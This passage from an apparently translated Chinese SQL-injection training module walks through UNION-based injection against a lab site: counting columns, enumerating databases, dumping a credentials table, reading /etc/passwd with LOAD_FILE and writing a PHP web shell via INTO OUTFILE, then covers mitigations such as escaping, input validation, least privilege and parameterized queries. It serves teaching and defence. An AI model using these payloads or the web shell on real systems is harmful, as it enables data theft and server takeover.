passwords\n```\n\n如果我们在原始查询的表中有更多的列，我们必须添加更多的数字来创建剩余的所需列。例如，如果原始查询用于`SELECT`具有四列的表，我们的`UNION`注入将是：\n\n```sql\nUNION SELECT username, 2, 3, 4 from passwords-- '\n```\n\n此查询将返回：\n\n```shell-session\nmysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '\n\n+-----------+-----------+-----------+-----------+\n| product_1 | product_2 | product_3 | product_4 |\n+-----------+-----------+-----------+-----------+\n|   admin   |    2      |    3      |    4      |\n+-----------+-----------+-----------+-----------+\n```\n\n正如我们所见，我们想要的 ' `UNION SELECT username from passwords`' 查询输出位于第二行的第一列，而数字填充了其余列。\n\n## 0x08 Union Injection\n\n现在我们知道 Union 子句是如何工作的以及如何使用它让我们学习如何在我们的 SQL 注入中使用它。让我们来看下面的例子：\n\n![img](https://p.ipic.vip/5yfxhm.png)\n\n我们在搜索参数中看到了潜在的 SQL 注入。我们通过注入单引号 ( ) 来应用 SQLi Discovery 步骤`'`，但我们确实收到错误：\n\n![img](https://p.ipic.vip/pabe77.png)\n\n由于我们造成了错误，这可能意味着该页面容易受到 SQL 注入攻击。这种情况非常适合通过基于联合的注入进行利用，因为我们可以看到我们的查询结果。\n\n------\n\n### 检测列数\n\n在继续使用基于联合的查询之前，我们需要找到服务器选择的列数。有两种检测列数的方法：\n\n- 使用`ORDER BY`\n- 使用`UNION`\n\n##### 使用 ORDER BY\n\n检测列数的第一种方法是通过`ORDER BY`我们之前讨论过的函数。我们必须注入一个查询，该查询按我们指定的列对结果进行排序，“即第 1 列、第 2 列等等”，直到我们收到一个错误，指出指定的列不存在。\n\n例如，我们可以从 开始`order by 1`，按第一列排序，然后成功，因为表必须至少有一个列。然后我们会做`order by 2`，然后`order by 3`直到我们到达一个返回错误的数字，或者页面没有显示任何输出，这意味着这个列号不存在。我们成功排序的最终成功列为我们提供了列总数。\n\n如果我们在 处失败`order by 4`，这意味着该表有三列，这是我们能够成功排序的列数。让我们回到之前的示例并尝试使用以下有效负载进行相同的操作：\n\n```sql\n' order by 1-- -\n```\n\n提醒：我们在末尾添加了一个额外的破折号 (-)，以向您表明 (--) 之后有一个空格。\n\n如我们所见，我们得到了一个正常的结果：\n\n![img](https://p.ipic.vip/5yfxhm.png)\n\n接下来，让我们尝试使用以下有效负载按第二列排序：\n\n```sql\n' order by 2-- -\n```\n\n我们仍然得到结果。我们注意到它们的排序方式与预期的不同：\n\n![img](https://p.ipic.vip/eo1va8.jpg)\n\n`3`我们对 column和做同样的事情`4`并得到结果。但是，当我们尝试`ORDER BY`第 5 列时，出现以下错误：\n\n![img](https://p.ipic.vip/d109h9.jpg)\n\n这意味着该表恰好有 4 列。\n\n##### 使用 UNION\n\n另一种方法是尝试使用不同数量的列进行联合注入，直到我们成功取回结果。第一个方法总是返回结果，直到我们遇到错误，而这个方法总是给出错误，直到我们获得成功。我们可以从注入一个 3 列`UNION`查询开始：\n\n```sql\ncn' UNION select 1,2,3-- -\n```\n\n我们收到一条错误消息，指出列数不匹配：  \n\n![img](https://p.ipic.vip/65slq5.png)\n\n因此，让我们尝试四列并查看响应：\n\n```sql\ncn' UNION select 1,2,3,4-- -\n```\n\n![img](https://p.ipic.vip/sz9ia5.png)\n\n这次我们成功得到了结果，这意味着该表再次具有 4 列。我们可以使用任何一种方法来确定列数。一旦我们知道了列数，我们就知道如何形成我们的有效载荷，我们可以继续下一步。\n\n------\n\n### 注射位置\n\n虽然查询可能返回多列，但 Web 应用程序可能只显示其中的一部分。因此，如果我们将查询注入到页面上未打印的列中，我们将无法获得其输出。这就是为什么我们需要确定将哪些列打印到页面，以确定在何处放置我们的注入。在前面的示例中，虽然注入的查询返回 1、2、3 和 4，但我们在页面上只看到 2、3 和 4 作为输出数据返回给我们：\n\n![img](https://p.ipic.vip/sz9ia5.png)\n\n并非每一列都会显示给用户是很常见的。例如，ID 字段通常用于将不同的表链接在一起，但用户不需要看到它。这告诉我们打印了第 2 列、第 3 列和第 4 列以将我们的注入放置在其中任何一个中。`We cannot place our injection at the beginning, or its output will not be printed.`\n\n这是使用数字作为我们的垃圾数据的好处，因为它可以很容易地跟踪打印了哪些列，因此我们知道在哪一列放置我们的查询。为了测试我们是否可以从数据库中获取“而不仅仅是数字”的实际数据，我们可以使用`@@version`SQL 查询作为测试并将其放在第二列而不是数字 2 中：\n\n```sql\ncn' UNION select 1,@@version,3,4-- -\n```\n\n![img](https://p.ipic.vip/egjoic.jpg)\n\n如我们所见，我们可以获得显示的数据库版本。现在我们知道如何形成我们的 Union SQL 注入有效负载，以成功地获得打印在页面上的查询输出。在下一节中，我们将讨论如何枚举数据库并从其他表和数据库中获取数据。\n\n## 0x09 数据库枚举\n\n在前面的部分中，我们了解了不同的 SQL 查询`MySQL`和 SQL 注入以及如何使用它们。本节将使用所有这些，并在 SQL 注入中使用 SQL 查询从数据库中收集数据。\n\n------\n\n### MySQL指纹识别\n\n在枚举数据库之前，我们通常需要确定我们正在处理的 DBMS 类型。这是因为每个 DBMS 都有不同的查询，知道它是什么将帮助我们知道使用什么查询。\n\n作为初步猜测，如果我们在 HTTP 响应中看到的 Web 服务器是`Apache`或`Nginx`，则可以很好地猜测该 Web 服务器正在 Linux 上运行，因此 DBMS 很可能是`MySQL`。如果网络服务器是，这同样也适用于 Microsoft DBMS `IIS`，所以它很可能是`MSSQL`。然而，这是一个牵强附会的猜测，因为许多其他数据库可以在操作系统或 Web 服务器上使用。因此，我们可以测试不同的查询来识别我们正在处理的数据库类型。\n\n正如我们`MySQL`在本模块中介绍的那样，让我们使用指纹`MySQL`数据库。以下查询及其输出将告诉我们我们正在处理`MySQL`：\n\n| 有效载荷           | 何时使用                 | 预期产出                                | 输出错误                                         |\n| ------------------ | ------------------------ | --------------------------------------- | ------------------------------------------------ |\n| `SELECT @@version` | 当我们有完整的查询输出时 | MySQL版本'即`10.3.22-MariaDB-1ubuntu1`' | 在 MSSQL 中，它返回 MSSQL 版本。其他 DBMS 出错。 |\n| `SELECT POW(1,1)`  | 当我们只有数字输出时     | `1`                                     | 其他 DBMS 出错                                   |\n| `SELECT SLEEP(5)`  | 盲/无输出                | 延迟页面响应 5 秒并返回`0`。            | 不会延迟与其他 DBMS 的响应                       |\n\n正如我们在上一节的示例中看到的，当我们尝试时`@@version`，它给了我们：\n\n![img](https://p.ipic.vip/vejupm.jpg)\n\n输出`10.3.22-MariaDB-1ubuntu1`意味着我们正在处理`MariaDB`类似于 MySQL 的 DBMS。由于我们有直接的查询输出，因此我们不必测试其他有效载荷。相反，我们可以测试它们，看看我们得到了什么。\n\n------\n\n### INFORMATION_SCHEMA 数据库\n\n要使用从表中提取数据`UNION SELECT`，我们需要正确地形成我们的`SELECT`查询。为此，我们需要以下信息：\n\n- 数据库列表\n- 每个数据库中的表列表\n- 每个表中的列列表\n\n有了以上信息，我们就可以形成我们的`SELECT`语句，从 DBMS 内的任何数据库中的任何表中的任何列中转储数据。这是我们可以使用`INFORMATION_SCHEMA`数据库的地方。\n\nINFORMATION_SCHEMA数据库包含有关服务器上存在[的](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html)数据库和表的元数据。该数据库在利用 SQL 注入漏洞时起着至关重要的作用。由于这是一个不同的数据库，我们不能直接用语句调用它的表`SELECT`。如果我们只为语句指定一个表的名称`SELECT`，它将在同一数据库中查找表。\n\n因此，要引用另一个数据库中存在的表，我们可以使用点 ' `.`' 运算符。例如，对于名为 的数据库中存在的`SELECT`表，我们可以使用：`users``my_database`\n\n```sql\nSELECT * FROM my_database.users;\n```\n\n同样，我们可以查看`INFORMATION_SCHEMA`数据库中存在的表。\n\n------\n\n### 图式\n\n要开始我们的枚举，我们应该找到 DBMS 上可用的数据库。数据库中的表[SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)`INFORMATION_SCHEMA`包含有关服务器上所有数据库的信息。它用于获取数据库名称，以便我们可以查询它们。该`SCHEMA_NAME`列包含当前存在的所有数据库名称。\n\n让我们先在本地数据库上测试一下，看看查询是如何使用的：\n\n```shell-session\nmysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;\n\n+--------------------+\n| SCHEMA_NAME        |\n+--------------------+\n| mysql              |\n| information_schema |\n| performance_schema |\n| ilfreight          |\n| dev                |\n+--------------------+\n6 rows in set (0.01 sec)\n```\n\n我们看到了`ilfreight`和`dev`数据库。\n\n注意：前三个数据库是默认的 MySQL 数据库，并且存在于任何服务器上，因此我们通常在数据库枚举时忽略它们。有时还有第四个“系统”数据库。\n\n现在，让我们使用`UNION`SQL 注入来执行相同的操作，并使用以下有效负载：\n\n```sql\ncn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -\n```\n\n![img](https://p.ipic.vip/tsychv.png)\n\n除了默认数据库之外，我们再次看到两个数据库，`ilfreight`和。`dev`让我们找出 Web 应用程序正在运行的数据库以从中检索端口数据。我们可以通过查询找到当前数据库`SELECT database()`。我们可以像在上一节中查找 DBMS 版本的方式一样执行此操作：\n\n```sql\ncn' UNION select 1,database(),2,3-- -\n```\n\n![img](https://p.ipic.vip/4zwupa.jpg)\n\n我们看到数据库名称是`ilfreight`. 然而，另一个数据库 ( `dev`) 看起来很有趣。因此，让我们尝试从中检索表格。\n\n------\n\n### 桌子\n\n在我们从数据库中转储数据之前`dev`，我们需要获取表的列表以使用`SELECT`语句查询它们。要查找数据库中的所有表，我们可以使用数据库`TABLES`中的表`INFORMATION_SCHEMA`。\n\n[TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)表包含有关整个数据库中所有表的信息。该表包含多个列，但我们对`TABLE_SCHEMA`和`TABLE_NAME`列感兴趣。列`TABLE_NAME`存储表名，而`TABLE_SCHEMA`列指向每个表所属的数据库。这可以类似于我们找到数据库名称的方式来完成。例如，我们可以使用以下有效负载来查找`dev`数据库中的表：\n\n```sql\ncn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -\n```\n\n请注意我们如何用“TABLE_NAME”和“TABLE_SCHEMA”替换数字“2”和“3”，以获取同一查询中两列的输出。\n\n![img](https://p.ipic.vip/h240uh.png)\n\n注意：我们添加了一个 (where table_schema='dev') 条件来只返回来自 'dev' 数据库的表，否则我们会得到所有数据库中的所有表，这可能有很多。\n\n我们在 dev 数据库中看到四个表，即`credentials`、`framework`、`pages`和`posts`。例如，该`credentials`表可能包含要查看的敏感信息。\n\n------\n\n### 列\n\n要转储表的数据`credentials`，首先要找到表中的列名，可以在数据库`COLUMNS`中的表中找到`INFORMATION_SCHEMA`。COLUMNS表包含有关所有数据库中存在的所有列的信息[。](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html)这有助于我们找到查询表的列名。、和列可用于实现此目的`COLUMN_NAME`。正如我们之前所做的那样，让我们尝试使用此有效负载来查找表中的列名：`TABLE_NAME``TABLE_SCHEMA``credentials`\n\n```sql\ncn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -  \n```\n\n![img](https://p.ipic.vip/i7lof8.jpg)\n\n该表有两列，名为`username`和`password`。我们可以使用此信息并从表中转储数据。\n\n------\n\n### 数据\n\n现在我们有了所有的信息，我们可以形成我们的查询来从数据库中的表中`UNION`转储`username`和`password`列的数据。我们可以用and代替第 2 列和第 3 列：`credentials``dev``username``password`\n\n```sql\ncn' UNION select 1, username, password, 4 from dev.credentials-- -\n```\n\n请记住：不要忘记使用点运算符来引用“开发”数据库中的“凭据”，因为我们在“ilfreight”数据库中运行，如前所述。\n\n![img](https://p.ipic.vip/n9oypj.png)\n\n我们能够获取`credentials`表中的所有条目，其中包含密码哈希和 API 密钥等敏感信息。\n\n## 0x10 读取文件\n\n除了从 DBMS 中的各种表和数据库中收集数据外，SQL 注入还可以用于执行许多其他操作，例如在服务器上读取和写入文件，甚至在后端服务器上获得远程代码执行。\n\n------\n\n### 特权\n\n读取数据比写入数据更为常见，在现代 DBMS 中，写入数据严格保留给特权用户使用，因为它会导致系统利用，正如我们将看到的那样。例如，在 中`MySQL`，DB 用户必须有权`FILE`将文件的内容加载到表中，然后从该表中转储数据并读取文件。因此，让我们从收集有关我们在数据库中的用户权限的数据开始，以决定我们是否将文件读取和/或写入后端服务器。\n\n##### 数据库用户\n\n首先，我们必须确定我们在数据库中是哪个用户。虽然我们不一定需要数据库管理员 (DBA) 权限来读取数据，但在现代 DBMS 中这变得越来越需要，因为只有 DBA 才被授予此类权限。这同样适用于其他常见的数据库。如果我们确实拥有 DBA 权限，那么我们更有可能拥有文件读取权限。如果我们不这样做，那么我们必须检查我们的特权，看看我们能做什么。为了能够找到我们当前的数据库用户，我们可以使用以下任何查询：\n\n```sql\nSELECT USER()\nSELECT CURRENT_USER()\nSELECT user from mysql.user\n```\n\n我们的`UNION`注入有效载荷如下：\n\n```sql\ncn' UNION SELECT 1, user(), 3, 4-- -\n```\n\n或者：\n\n```sql\ncn' UNION SELECT 1, user, 3, 4 from mysql.user-- -\n```\n\n这告诉我们我们当前的用户，在这种情况下是`root`：\n\n![img](https://p.ipic.vip/mt3xp0.jpg)\n\n这是非常有前途的，因为根用户很可能是 DBA，这给了我们很多特权。\n\n##### 用户权限\n\n现在我们知道了我们的用户，我们可以开始寻找我们对那个用户有什么特权。首先，我们可以通过以下查询来测试我们是否拥有超级管理员权限：\n\n```sql\nSELECT super_priv FROM mysql.user\n```\n\n再一次，我们可以在上述查询中使用以下有效负载：\n\n```sql\ncn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -\n```\n\n如果我们在 DBMS 中有很多用户，我们可以添加`WHERE user=\"root\"`只显示当前用户的权限`root`：\n\n```sql\ncn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=\"root\"-- -  \n```\n\n![img](https://p.ipic.vip/d6y0ff.jpg)\n\n查询返回`Y`，这意味着`YES`，表示超级用户权限。我们还可以使用以下查询直接从模式中转储我们拥有的其他特权：\n\n```sql\ncn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -\n```\n\n再一次，我们可以添加`WHERE user=\"root\"`以仅显示我们当前的用户`root`权限。我们的有效载荷将是：\n\n```sql\ncn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE user=\"root\"-- -\n```\n\n我们看到了所有可能赋予我们当前用户的权限：\n\n![img](https://p.ipic.vip/yv5vct.jpg)\n\n我们看到`FILE`为我们的用户列出了权限，使我们能够读取文件甚至可能写入文件。因此，我们可以继续尝试读取文件。\n\n------\n\n### 加载文件\n\n现在我们知道我们有足够的权限来读取本地系统文件，让我们使用函数来做到这一点`LOAD_FILE()`。LOAD_FILE [()](https://mariadb.com/kb/en/load_file/)函数可用于 MariaDB / MySQL 从文件中读取数据。该函数只接受一个参数，即文件名。以下查询是如何读取文件的示例`/etc/passwd`：\n\n```sql\nSELECT LOAD_FILE('/etc/passwd');\n```\n\n注意：如果运行 MySQL 的 OS 用户有足够的权限读取文件，我们将只能读取该文件。\n\n类似于我们一直使用`UNION`注入的方式，我们可以使用上面的查询：\n\n```sql\ncn' UNION SELECT 1, LOAD_FILE(\"/etc/passwd\"), 3, 4-- -\n```\n\n![img](https://p.ipic.vip/pukwyf.png)\n\n我们能够通过SQL注入成功读取到passwd文件的内容。不幸的是，这也可能被用来泄露应用程序源代码。\n\n------\n\n### 另一个例子\n\n我们知道当前页面是`search.php`。默认的 Apache webroot 是`/var/www/html`. 让我们尝试阅读文件的源代码`/var/www/html/search.php`。\n\n```sql\ncn' UNION SELECT 1, LOAD_FILE(\"/var/www/html/search.php\"), 3, 4-- -\n```\n\n![img](https://p.ipic.vip/1alxqy.png)\n\n但是，该页面最终会在浏览器中呈现 HTML 代码。可以通过点击查看 HTML 源代码`[Ctrl + U]`。\n\n![加载文件源](https://p.ipic.vip/e0u51d.png)\n\n源代码向我们展示了完整的 PHP 代码，可以对其进行进一步检查以查找敏感信息（如数据库连接凭据）或查找更多漏洞。\n\n## 0x11 写入文件\n\n当涉及到将文件写入后端服务器时，它在现代 DBMS 中变得更加受限，因为我们可以利用它在远程服务器上编写一个 web shell，从而执行代码并接管服务器。这就是现代 DBMS 默认禁用文件写入并要求 DBA 具有某些权限才能写入文件的原因。在写文件之前，我们首先要检查自己是否有足够的权限，DBMS是否允许写文件。\n\n------\n\n### 写文件权限\n\n为了能够使用 MySQL 数据库将文件写入后端服务器，我们需要三件事：\n\n1. `FILE`启用权限的用户\n2. `secure_file_priv`未启用MySQL 全局变量\n3. 对后端服务器上我们要写入的位置的写入权限\n\n我们已经发现我们的当前用户具有`FILE`写入文件所需的权限。我们现在必须检查 MySQL 数据库是否具有该权限。这可以通过检查全局变量来完成`secure_file_priv`。\n\n##### secure_file_priv\n\n[secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv)变量用于确定从何处读取/写入文件。一个空值可以让我们从整个文件系统中读取文件。否则，如果设置了某个目录，我们只能从变量指定的文件夹中读取。另一方面，`NULL`意味着我们不能从任何目录读/写。MariaDB 将此变量默认设置为空，如果用户有权限，这允许我们读/写任何文件`FILE`。但是，`MySQL`用作`/var/lib/mysql-files`默认文件夹。这意味着`MySQL`使用默认设置无法通过注入读取文件。更糟糕的是，一些现代配置默认为`NULL`，这意味着我们无法在系统内的任何地方读取/写入文件。\n\n那么，让我们看看如何找出 的值`secure_file_priv`。在 中`MySQL`，我们可以使用以下查询来获取此变量的值：\n\n```sql\nSHOW VARIABLES LIKE 'secure_file_priv';\n```\n\n但是，由于我们正在使用`UNION`注入，因此我们必须使用语句来获取值`SELECT`。这应该不是问题，因为所有变量和大多数配置都存储在`INFORMATION_SCHEMA`数据库中。`MySQL`全局变量存储在一个名为[global_variables 的](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html)表中，根据文档，该表有两列`variable_name`和`variable_value`。\n\n我们必须从`INFORMATION_SCHEMA`数据库中的那个表中选择这两列。MySQL 配置中有数百个全局变量，我们不想检索所有这些变量。`secure_file_priv`然后，我们将使用`WHERE`我们在上一节中学到的子句过滤结果以仅显示变量。\n\n最终的 SQL 查询如下：\n\n```sql\nSELECT variable_name, variable_value FROM information_schema.global_variables where variable_name=\"secure_file_priv\"\n```\n\n因此，与其他注入查询类似`UNION`，我们可以使用以下 payload 获得上述查询结果。请记住再添加两列`1`&`4`作为垃圾数据，总共有 4 列'：\n\n```sql\ncn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=\"secure_file_priv\"-- -\n```\n\n![img](https://p.ipic.vip/h557d4.jpg)\n\n结果显示该`secure_file_priv`值为空，这意味着我们可以将文件读/写到任何位置。\n\n------\n\n### 选择进入 OUTFILE\n\n现在我们已经确认我们的用户应该将文件写入后端服务器，让我们尝试使用语句来做到这一点`SELECT .. INTO OUTFILE`。SELECT [INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/)语句可用于将来自选择查询的数据写入文件。这通常用于从表中导出数据。\n\n要使用它，我们可以`INTO OUTFILE '...'`在查询之后添加以将结果导出到我们指定的文件中。下面的示例将表的输出保存`users`到文件中`/tmp/credentials`：\n\n secure_file_priv\n\n```shell-session\nSELECT * from users INTO OUTFILE '/tmp/credentials';\n```\n\n如果我们转到后端服务器和`cat`文件，我们会看到该表的内容：\n\n secure_file_priv\n\n```shell-session\nsl1aun@htb[/htb]$ cat /tmp/credentials \n\n1       admin   392037dbba51f692776d6cefb6dd546d\n2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f\n```\n\n也可以直接将`SELECT`字符串写入文件，让我们可以向后端服务器写入任意文件。\n\n```sql\nSELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';\n```\n\n当我们`cat`打开文件时，我们会看到该文本：\n\n secure_file_priv\n\n```shell-session\nsl1aun@htb[/htb]$ cat /tmp/test.txt \n\nthis is a test\n```\n\n secure_file_priv\n\n```shell-session\nsl1aun@htb[/htb]$ ls -la /tmp/test.txt \n\n-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt\n```\n\n正如我们在上面看到的，该`test.txt`文件已成功创建并归`mysql`用户所有。\n\n提示：高级文件导出利用“FROM_BASE64(\"base64_data\")”函数，以便能够写入长文件/高级文件，包括二进制数据。\n\n------\n\n### 通过 SQL 注入写入文件\n\n让我们尝试向 webroot 写入一个文本文件并验证我们是否具有写入权限。下面的查询应该写入`file written successfully!`文件`/var/www/html/proof.txt`，然后我们可以在 Web 应用程序上访问该文件：\n\n```sql\nselect 'file written successfully!' into outfile '/var/www/html/proof.txt'\n```\n\n**注意：**要编写 web shell，我们必须知道 web 服务器的基本 web 目录（即 web root）。找到它的一种方法是使用`load_file`读取服务器配置，例如在 找到 Apache 的配置`/etc/apache2/apache2.conf`，在 找到 Nginx 的配置`/etc/nginx/nginx.conf`，或者在 找到 IIS 配置`%WinDir%\\System32\\Inetsrv\\Config\\ApplicationHost.config`，或者我们可以在线搜索其他可能的配置位置。此外，我们可能会运行模糊扫描并尝试将文件写入不同的可能的 Web 根目录，使用[这个 Linux 的词表](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)或[这个 Windows 的词表](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)。最后，如果以上方法都不起作用，我们可以使用显示给我们的服务器错误并尝试以这种方式找到 web 目录。\n\n注入`UNION`有效载荷如下：\n\n```sql\ncn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -\n```\n\n![img](https://p.ipic.vip/hkrsmg.png)\n\n我们在页面上没有看到任何错误，这表明查询成功了。`proof.txt`检查webroot 中的文件，我们看到它确实存在：\n\n![img](https://p.ipic.vip/40z8r3.png)\n\n注意：我们看到我们转储的字符串以及前面的“1”、“3”和后面的“4”。这是因为整个“UNION”查询结果都写入了文件。为了使输出更清晰，我们可以使用 \"\" 而不是数字。\n\n------\n\n### 编写网络外壳\n\n确认写入权限后，我们可以继续将 PHP web shell 写入 webroot 文件夹。我们可以编写如下的PHP webshell来直接在后台服务器上执行命令：\n\n```php\n<?php system($_REQUEST[0]); ?>\n```\n\n我们可以重用我们之前的`UNION`注入载荷，并将字符串更改为上面的字符串，并将文件名更改为`shell.php`：\n\n```sql\ncn' union select \"\",'<?php system($_REQUEST[0]); ?>', \"\", \"\" into outfile '/var/www/html/shell.php'-- -\n```\n\n  ', “ “, “ “ 进入输出文件 '/var/www/html/shell.php'-- -'>\n\n![img](https://p.ipic.vip/ur051n.png)\n\n再一次，我们没有看到任何错误，这意味着文件写入可能有效。`/shell.php`这可以通过浏览到文件并通过参数执行命令来验证`0`，`?0=id`在我们的 URL 中：\n\n![img](https://p.ipic.vip/2kzupt.png)\n\n该`id`命令的输出确认我们执行了代码并以用户身份运行`www-data`。\n\n## 0x12 缓解 SQL 注入\n\n------\n\n我们已经了解了 SQL 注入、它们发生的原因以及我们如何利用它们。我们还应该学习如何在我们的代码中避免这些类型的漏洞，并在发现它们时对其进行修补。让我们看一些如何缓解 SQL 注入的示例。\n\n------\n\n### 输入消毒\n\n这是我们之前讨论的身份验证绕过部分的代码片段：\n\n```php\n<SNIP>\n  $username = $_POST['username'];\n  $password = $_POST['password'];\n\n  $query = \"SELECT * FROM logins WHERE username='\". $username. \"' AND password = '\" . $password . \"';\" ;\n  echo \"Executing query: \" . $query . \"<br /><br />\";\n\n  if (!mysqli_query($conn ,$query))\n  {\n          die('Error: ' . mysqli_error($conn));\n  }\n\n  $result = mysqli_query($conn, $query);\n  $row = mysqli_fetch_array($result);\n<SNIP>\n```\n\n正如我们所看到的，脚本从 POST 请求中获取 和 并将其直接传递给查询`username`。`password`这将使攻击者可以注入他们想要的任何东西并利用该应用程序。可以通过清理任何用户输入来避免注入，使注入的查询无用。库提供了多种函数来实现这一点，一个这样的例子是[mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php)函数。此函数对诸如`'`and之类的字符进行转义`\"`，因此它们没有任何特殊含义。\n\n```php\n<SNIP>\n$username = mysqli_real_escape_string($conn, $_POST['username']);\n$password = mysqli_real_escape_string($conn, $_POST['password']);\n\n$query = \"SELECT * FROM logins WHERE username='\". $username. \"' AND password = '\" . $password . \"';\" ;\necho \"Executing query: \" . $query . \"<br /><br />\";\n<SNIP>\n```\n\n上面的代码片段显示了如何使用该函数。\n\n![mysqli_escape](https://p.ipic.vip/chzyde.png)\n\n正如预期的那样，由于转义了单引号，注入不再有效。一个类似的例子是用于转义 PostgreSQL 查询的[pg_escape_string() 。](https://www.php.net/manual/en/function.pg-escape-string.php)\n\n------\n\n### 输入验证\n\n还可以根据用于查询的数据验证用户输入，以确保它与预期输入相匹配。例如，当将电子邮件作为输入时，我们可以验证输入的形式是`...@email.com`，等等。\n\n考虑端口页面中的以下代码片段，我们`UNION`在其中使用了注入：\n\n```php\n<?php\nif (isset($_GET[\"port_code\"])) {\n\t$q = \"Select * from ports where port_code ilike '%\" . $_GET[\"port_code\"] . \"%'\";\n\t$result = pg_query($conn,$q);\n    \n\tif (!$result)\n\t{\n   \t\tdie(\"</table></div><p style='font-size: 15px;'>\" . pg_last_error($conn). \"</p>\");\n\t}\n<SNIP>\n?>\n```\n\n`port_code`我们看到直接在查询中使用了GET 参数。众所周知，端口号仅由字母或空格组成。我们可以将用户输入限制为仅这些字符，这将防止注入查询。正则表达式可用于验证输入：\n\n```php\n<SNIP>\n$pattern = \"/^[A-Za-z\\s]+$/\";\n$code = $_GET[\"port_code\"];\n\nif(!preg_match($pattern, $code)) {\n  die(\"</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>\");\n}\n\n$q = \"Select * from ports where port_code ilike '%\" . $code . \"%'\";\n<SNIP>\n```\n\n代码被修改为使用[preg_match()](https://www.php.net/manual/en/function.preg-match.php)函数，该函数检查输入是否与给定模式匹配。使用的模式是`[A-Za-z\\s]+`，它将只匹配包含字母和空格的字符串。任何其他字符都将导致脚本终止。\n\n![img](https://p.ipic.vip/xgrdd8.png)\n\n我们可以测试下面的注入：\n\n```sql\n'; SELECT 1,2,3,4-- -\n```\n\n![img](https://p.ipic.vip/xgrdd8.png)\n\n如上图所示，注入查询的输入被服务器拒绝。\n\n------\n\n### 用户权限\n\n正如最初讨论的那样，DBMS 软件允许创建具有细粒度权限的用户。我们应该确保查询数据库的用户只有最小权限。\n\n超级用户和具有管理权限的用户永远不应该与 Web 应用程序一起使用。这些帐户可以访问可能导致服务器受损的功能和特性。\n\n```shell-session\nMariaDB [(none)]> CREATE USER 'reader'@'localhost';\n\nQuery OK, 0 rows affected (0.002 sec)\n\n\nMariaDB [(none)]> GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';\n\nQuery OK, 0 rows affected (0.000 sec)\n```\n\n上面的命令添加了一个名为 who 的新 MariaDB 用户，`reader`该用户仅被授予`SELECT`表的权限`ports`。我们可以通过登录验证该用户的权限：\n\n```shell-session\nsl1aun@htb[/htb]$ mysql -u reader -p\n\nMariaDB [(none)]> use ilfreight;\nMariaDB [ilfreight]> SHOW TABLES;\n\n+---------------------+\n| Tables_in_ilfreight |\n+---------------------+\n| ports               |\n+---------------------+\n1 row in set (0.000 sec)\n\n\nMariaDB [ilfreight]> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;\n\n+--------------------+\n| SCHEMA_NAME        |\n+--------------------+\n| information_schema |\n| ilfreight          |\n+--------------------+\n2 rows in set (0.000 sec)\n\n\nMariaDB [ilfreight]> SELECT * FROM ilfreight.credentials;\nERROR 1142 (42000): SELECT command denied to user 'reader'@'localhost' for table 'credentials'\n```\n\n上面的代码片段确认`reader`用户无法查询`ilfreight`数据库中的其他表。用户只能访问`ports`应用程序所需的表。\n\n------\n\n### Web 应用防火墙\n\nWeb 应用程序防火墙 (WAF) 用于检测恶意输入并拒绝包含它们的任何 HTTP 请求。即使应用程序逻辑存在缺陷，这也有助于防止 SQL 注入。WAF 可以是开源的 (ModSecurity) 或高级的 (Cloudflare)。他们中的大多数都有基于常见网络攻击配置的默认规则。例如，任何包含该字符串的请求`INFORMATION_SCHEMA`都将被拒绝，因为它通常在利用 SQL 注入时使用。\n\n------\n\n### 参数化查询\n\n另一种确保输入被安全清理的方法是使用参数化查询。参数化查询包含输入数据的占位符，然后由驱动程序转义并传递。我们不是直接将数据传递到 SQL 查询，而是使用占位符，然后用 PHP 函数填充它们。\n\n考虑以下修改后的代码：\n\n```php\n<SNIP>\n  $username = $_POST['username'];\n  $password = $_POST['password'];\n\n  $query = \"SELECT * FROM logins WHERE username=? AND password = ?\" ;\n  $stmt = mysqli_prepare($conn, $query);\n  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);\n  mysqli_stmt_execute($stmt);\n  $result = mysqli_stmt_get_result($stmt);\n\n  $row = mysqli_fetch_array($result);\n  mysqli_stmt_close($stmt);\n<SNIP>\n```\n\n查询被修改为包含两个占位符，标有用`?`户名和密码的放置位置。[然后我们使用mysqli_stmt_bind_param()](https://www.php.net/manual/en/mysqli-stmt.bind-param.php)函数将用户名和密码绑定到查询。这将安全地转义任何引号并将值放入查询中。\n\n------\n\n### 结论\n\n上面的列表并不详尽，仍然可以根据应用程序逻辑利用 SQL 注入。显示的代码示例基于 PHP，但逻辑适用于所有常见语言和库。\n\n","slug":"SQL-INJECTION-FUNDAMENTALS","published":1,"updated":"2023-05-02T03:21:09.724Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clh5pn0cs000b7ex26r3l17i3","content":"<h2 id=\"0x01-介绍\"><a 